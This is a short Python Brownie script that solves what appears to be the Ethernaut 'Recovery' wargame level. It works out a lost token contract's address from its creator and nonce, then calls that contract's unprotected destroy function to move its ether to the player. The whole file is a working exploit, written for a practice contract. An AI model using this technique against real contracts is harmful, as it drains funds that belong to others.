import rlp
from eth_utils import keccak, to_checksum_address, to_bytes
from scripts.helpful_scripts import get_account
from brownie import accounts, config, web3, interface

ETHERNAUT_INSTANCE = "0x0fDE65685b2f8f972784552adee9221909D2D6Cb"
GAS_LIMIT = 600000


""" 
    make_contract_address() function calculates the SimpleToken 
    contract address,this can be verified using etherscan
"""


def make_contract_address(sender: str, nonce: int) -> str:
    # convert sender address to bytes
    sender_bytes = to_bytes(hexstr=sender)
    # RLP encode the sender address and the nonce
    raw = rlp.encode([sender_bytes, nonce])
    # hash the RLP encoded data (keccak-256)
    hash = keccak(raw)
    # extract the contract address from the hash (last 12)
    address_bytes = hash[12:]
    # return address_bytes converted to a checksummed Ethereum address
    return to_checksum_address(address_bytes)


def main():
    player = get_account()

    # we need to retrieve address for SimpleToken contract this
    # contract is created at second transaction from main contract
    # hence we set nonce = 1 (2nd transaction)
    simple_token = make_contract_address(ETHERNAUT_INSTANCE, 1)

    print(f"Name: {web3.eth.get_storage_at(simple_token, 0)}")
    print(f"Initial balance: {web3.eth.getBalance(simple_token)}")

    simple = interface.ISimpleToken(simple_token)
    simple.destroy(player, {"from": player})

    print(f"Final balance: {web3.eth.getBalance(simple_token)}")
